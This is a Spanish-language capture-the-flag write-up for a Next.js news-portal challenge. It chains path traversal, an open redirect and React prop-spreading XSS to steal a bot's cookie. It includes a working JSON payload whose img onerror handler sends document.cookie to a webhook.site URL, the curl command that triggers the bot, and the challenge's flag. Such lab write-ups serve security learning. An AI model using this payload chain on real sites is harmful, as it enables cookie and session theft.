# Utopia City News Portal - CTF Writeup

**Challenge:** Utopia City News Portal
**Category:** Web
**Flag:** `flag{1ada6d8c6fb2d164}`

## Resumen

Encadenamiento de tres vulnerabilidades: **Path Traversal** + **Open Redirect** + **React Prop Spreading XSS** para robar una cookie FLAG del bot via `dangerouslySetInnerHTML`.

## Reconocimiento

La aplicacion es un portal de noticias construido con **Next.js 15** (React 19) que tiene:

- Articulos hardcodeados en el backend
- Sistema de comentarios con autenticacion JWT
- Un bot (Puppeteer) que visita URLs con una cookie `FLAG` sin `httpOnly`
- Pagina de articulo con una vulnerabilidad de prop spreading

## Vulnerabilidades Identificadas

### 1. Open Redirect en `/api/auth/logout`

```typescript
// src/pages/api/auth/logout.ts
if (req.query.redirect_url && typeof req.query.redirect_url === 'string') {
    return res.redirect(302, req.query.redirect_url);
}
```

El endpoint acepta peticiones GET y redirige a cualquier URL sin validacion.

### 2. Path Traversal en el fetch de articulos

```typescript
// src/pages/article/[id].tsx
const response = await fetch(`/api/articles/${slug}`);
```

El `slug` se extrae directamente del parametro de URL sin sanitizar. Usando `../../` se puede redirigir el fetch a otros endpoints internos.

### 3. React Prop Spreading XSS

```tsx
// src/pages/article/[id].tsx (linea 196)
{article.isDraft && (
    <div>
        <button {...article.draft} />
    </div>
)}
```

Si `article.draft` contiene `dangerouslySetInnerHTML`, React renderiza HTML arbitrario dentro del boton.

### 4. FLAG Cookie sin httpOnly

```typescript
// src/pages/api/bot.ts
await context.setCookie({
    name: "FLAG",
    value: FLAG,
    domain: APP_HOST,
    path: "/",
    // No httpOnly -> accesible via document.cookie
});
```

## Cadena de Explotacion

```
Bot visita /article/[payload]
        |
        v
Article page hace fetch('/api/articles/../../api/auth/logout?redirect_url=ATTACKER_URL')
        |
        v
URL se resuelve a /api/auth/logout?redirect_url=ATTACKER_URL
        |
        v
Endpoint responde con 302 redirect a ATTACKER_URL
        |
        v
fetch() sigue el redirect al servidor del atacante
        |
        v
Servidor atacante retorna JSON malicioso con CORS headers
        |
        v
React renderiza <button dangerouslySetInnerHTML={{__html: "<img src=x onerror=...>"}}>
        |
        v
XSS ejecuta -> document.cookie exfiltrado al atacante
        |
        v
FLAG capturada
```

## Explotacion

### Paso 1: Configurar webhook.site

Se configuro la respuesta personalizada del webhook con:

**Headers:**
- `Access-Control-Allow-Origin: *`
- `Content-Type: application/json`

**Body:**
```json
{
  "id": 1,
  "slug": "x",
  "title": "x",
  "excerpt": "x",
  "content": "x",
  "author": "x",
  "date": "2025-01-01",
  "category": "Transportation",
  "readTime": "1 min",
  "isDraft": true,
  "draft": {
    "dangerouslySetInnerHTML": {
      "__html": "<img src=x onerror=\"new Image().src='https://webhook.site/WEBHOOK_ID?c='+document.cookie\">"
    }
  }
}
```

El JSON incluye todos los campos requeridos por el template de React para evitar errores de renderizado, y el campo `draft` contiene `dangerouslySetInnerHTML` que inyecta una imagen con `onerror` para exfiltrar cookies.

### Paso 2: Enviar el bot

```bash
curl -X POST https://d5fda6581d0c05bd.chal.ctf.ae/api/bot \
  -H "Content-Type: application/json" \
  -d '{"path": "article/..%2F..%2Fapi%2Fauth%2Flogout%3Fredirect_url%3Dhttps%3A%2F%2Fwebhook.site%2FWEBHOOK_ID"}'
```

**Desglose del path:**
- `article/` - prefijo para que Next.js rutee a la pagina de articulo
- `..%2F..%2F` - path traversal (`../../`) codificado
- `api%2Fauth%2Flogout` - endpoint vulnerable al open redirect
- `%3Fredirect_url%3D` - query parameter (`?redirect_url=`)
- `https%3A%2F%2Fwebhook.site%2F...` - URL del atacante codificada

### Paso 3: Recibir la flag

En webhook.site se recibe una peticion GET con el query parameter:
```
?c=FLAG=flag{1ada6d8c6fb2d164}
```

## Notas Tecnicas

- **React y dangerouslySetInnerHTML:** Cuando se usa spread (`{...obj}`) en un elemento DOM de React, si el objeto contiene `dangerouslySetInnerHTML`, React lo procesa y renderiza el HTML crudo, sin importar que venga de un spread dinamico.

- **CORS en redirects:** Cuando un fetch same-origin es redirigido a un origen diferente, el browser aplica CORS al response final. El servidor del atacante debe responder con `Access-Control-Allow-Origin: *`.

- **Path traversal en fetch:** El browser resuelve paths relativos en URLs de fetch. `/api/articles/../../api/auth/logout` se normaliza a `/api/auth/logout`.

- **Next.js dynamic routes:** El parametro `[id]` decodifica los caracteres URL-encoded (`%2F` -> `/`), permitiendo la inyeccion de path traversal.
